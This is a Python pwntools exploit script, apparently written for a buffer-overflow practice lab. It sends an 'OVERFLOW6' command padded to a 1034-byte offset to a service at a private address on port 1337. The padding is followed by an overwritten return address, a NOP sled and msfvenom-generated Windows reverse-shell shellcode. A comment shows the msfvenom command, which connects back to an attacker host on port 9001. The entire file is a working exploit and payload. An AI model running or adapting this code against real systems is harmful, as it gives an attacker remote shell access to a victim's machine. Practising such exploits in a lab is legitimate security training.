#!/usr/bin/env python3

from pwn import *

host = "10.10.207.243"
port = 1337
s = remote(host, port)

total_length = 1500
offset = 1034
new_eip = p32(0x62501203)
nop = b"\x90" * 5
buf =  b""
buf += b"\xdb\xc9\xbb\x78\x95\xd3\x87\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x52\x31\x5a\x17\x83\xea\xfc\x03\x22\x86\x31"
buf += b"\x72\x2e\x40\x37\x7d\xce\x91\x58\xf7\x2b\xa0\x58\x63"
buf += b"\x38\x93\x68\xe7\x6c\x18\x02\xa5\x84\xab\x66\x62\xab"
buf += b"\x1c\xcc\x54\x82\x9d\x7d\xa4\x85\x1d\x7c\xf9\x65\x1f"
buf += b"\x4f\x0c\x64\x58\xb2\xfd\x34\x31\xb8\x50\xa8\x36\xf4"
buf += b"\x68\x43\x04\x18\xe9\xb0\xdd\x1b\xd8\x67\x55\x42\xfa"
buf += b"\x86\xba\xfe\xb3\x90\xdf\x3b\x0d\x2b\x2b\xb7\x8c\xfd"
buf += b"\x65\x38\x22\xc0\x49\xcb\x3a\x05\x6d\x34\x49\x7f\x8d"
buf += b"\xc9\x4a\x44\xef\x15\xde\x5e\x57\xdd\x78\xba\x69\x32"
buf += b"\x1e\x49\x65\xff\x54\x15\x6a\xfe\xb9\x2e\x96\x8b\x3f"
buf += b"\xe0\x1e\xcf\x1b\x24\x7a\x8b\x02\x7d\x26\x7a\x3a\x9d"
buf += b"\x89\x23\x9e\xd6\x24\x37\x93\xb5\x20\xf4\x9e\x45\xb1"
buf += b"\x92\xa9\x36\x83\x3d\x02\xd0\xaf\xb6\x8c\x27\xcf\xec"
buf += b"\x69\xb7\x2e\x0f\x8a\x9e\xf4\x5b\xda\x88\xdd\xe3\xb1"
buf += b"\x48\xe1\x31\x15\x18\x4d\xea\xd6\xc8\x2d\x5a\xbf\x02"
buf += b"\xa2\x85\xdf\x2d\x68\xae\x4a\xd4\xfb\xdb\x9b\xdd\xe7"
buf += b"\xb3\x99\xe1\x34\x6d\x17\x07\x50\x7d\x71\x90\xcd\xe4"
buf += b"\xd8\x6a\x6f\xe8\xf6\x17\xaf\x62\xf5\xe8\x7e\x83\x70"
buf += b"\xfa\x17\x63\xcf\xa0\xbe\x7c\xe5\xcc\x5d\xee\x62\x0c"
buf += b"\x2b\x13\x3d\x5b\x7c\xe5\x34\x09\x90\x5c\xef\x2f\x69"
buf += b"\x38\xc8\xeb\xb6\xf9\xd7\xf2\x3b\x45\xfc\xe4\x85\x46"
buf += b"\xb8\x50\x5a\x11\x16\x0e\x1c\xcb\xd8\xf8\xf6\xa0\xb2"
buf += b"\x6c\x8e\x8a\x04\xea\x8f\xc6\xf2\x12\x21\xbf\x42\x2d"
buf += b"\x8e\x57\x43\x56\xf2\xc7\xac\x8d\xb6\xf8\xe6\x8f\x9f"
buf += b"\x90\xae\x5a\xa2\xfc\x50\xb1\xe1\xf8\xd2\x33\x9a\xfe"
buf += b"\xcb\x36\x9f\xbb\x4b\xab\xed\xd4\x39\xcb\x42\xd4\x6b"
shellcode = buf         # msfvenom -p windows/shell_reverse_tcp LHOST=10.17.11.28 LPORT=9001 -b "\x00\x08\x2c\xad" -f py

payload = [
    b"OVERFLOW6 ",
    b"A" * offset,
    new_eip,
    nop,
    shellcode,
    b"C" * (total_length - offset - len(new_eip) - len(nop) - len(shellcode)),

]

payload = b"".join(payload)
s.send(payload)
s.close()